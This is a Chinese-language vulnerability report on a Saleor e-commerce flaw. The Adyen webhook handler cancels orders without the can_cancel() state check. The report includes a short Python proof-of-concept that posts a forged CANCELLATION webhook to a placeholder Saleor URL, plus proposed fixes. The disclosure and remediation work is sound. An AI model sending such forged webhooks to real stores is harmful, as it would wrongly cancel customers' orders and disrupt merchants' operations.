## 1. 漏洞简介


**漏洞名称**：订单系统 - 状态机绕过漏洞



**漏洞描述**：
在Adyen支付网关的webhook处理程序中，订单取消操作绕过了状态机验证，允许外部webhook调用直接取消任何状态的订单，违反了订单状态转换的业务规则。





## 2. 漏洞原理

1. **状态机验证缺失**：

   - 在`saleor/order/models.py`第487-503行定义了`can_cancel()`方法，用于验证订单是否可以取消
   - 该方法检查订单不能处于已取消、草稿、已过期状态，且不能有活跃的履行记录

2. **GraphQL层验证**：

   - 在`saleor/graphql/order/mutations/order_cancel.py`第20-30行，`clean_order_cancel()`函数正确调用`order.can_cancel()`进行验证

3. **漏洞入口点**：

   - 在`saleor/payment/gateways/adyen/webhooks.py`第393行，webhook处理程序直接调用`cancel_order()`函数：

   ```python
   # saleor/payment/gateways/adyen/webhooks.py:393
   cancel_order(payment.order, None, None, manager)
   ```

   - 该调用完全绕过了`can_cancel()`验证，允许任何状态的订单被取消

4. **业务规则违反**：

   - 根据`can_cancel()`逻辑，已履行的订单、等待审批的订单等不应该被取消
   - 但通过Adyen webhook，这些订单可以被强制取消，导致业务逻辑混乱





## 3. 漏洞风险


**风险等级：**HIGH



**风险描述：**
**潜在危害**：

- 已履行的订单被取消，导致库存管理混乱和客户服务问题
- 等待审批的履行订单被取消，破坏审批工作流
- 财务数据不一致，支付已处理但订单被取消
- 供应链和物流管理混乱

**受影响资产**：

- 订单管理系统
- 库存管理系统  
- 支付处理系统
- 客户服务流程

**业务影响**：

- 高 - 可能导致严重的业务逻辑违规和客户投诉
- 高 - 影响财务数据的准确性和完整性
- 中 - 可能影响供应链和物流操作







## 4. 漏洞复现


**复现前提**：

- Saleor电商平台环境
- 配置Adyen支付网关
- 具有MANAGE_ORDERS权限的用户账户
- 处于不可取消状态的订单（如已履行、等待审批等）
- 能够发送Adyen webhook请求的环境



**复现难度评估：**中 - 需要配置Adyen支付网关并能够发送webhook请求，但一旦配置完成，漏洞利用相对简单



**复现POC**：
**复现思路**：

1. 创建一个处于不可取消状态的订单（如已履行）
2. 模拟Adyen webhook发送取消通知
3. 验证订单被强制取消，违反业务规则

**一键复现脚本**：

```python
import requests
import json

# 配置参数
webhook_url = "https://your-saleor-instance.com/webhooks/adyen/"
order_id = "不可取消的订单ID"

# 构造Adyen取消webhook
webhook_payload = {
    "notificationItems": [{
        "NotificationRequestItem": {
            "eventCode": "CANCELLATION",
            "success": "true",
            "additionalData": {
                "modification.action": "cancel"
            },
            "merchantReference": order_id
        }
    }]
}

# 发送webhook请求
response = requests.post(
    webhook_url,
    json=webhook_payload,
    headers={"Content-Type": "application/json"}
)

print(f"Webhook响应: {response.status_code}")
print(f"响应内容: {response.text}")

# 验证订单状态
# 订单应该被强制取消，即使根据业务规则不应该被取消
```





## 5. 修复方案

**修复方案**：

1. **在webhook处理程序中添加状态验证**：

   ```python
   # saleor/payment/gateways/adyen/webhooks.py
   if payment.order and new_transaction.is_success:
       manager = get_plugins_manager(allow_replica=False)
       # 添加状态验证
       if payment.order.can_cancel():
           cancel_order(payment.order, None, None, manager)
       else:
           logger.warning(f"Order {payment.order.id} cannot be canceled due to business rules")
   ```

2. **在cancel_order函数中添加防御性检查**：

   ```python
   # saleor/order/actions.py
   def cancel_order(order, user, app, manager, webhook_event_map=None):
       # 添加状态验证
       if not order.can_cancel():
           raise ValidationError("Order cannot be canceled due to business rules")
       
       # 原有逻辑...
       with traced_atomic_transaction():
           events.order_canceled_event(order=order, user=user, app=app)
           # ...
   ```

3. **统一状态转换接口**：

   - 创建统一的状态转换服务，所有状态变更必须通过该服务
   - 在服务中强制执行状态机验证

4. **添加监控和告警**：

   - 监控webhook处理中的状态验证失败
   - 设置告警机制，及时发现异常状态转换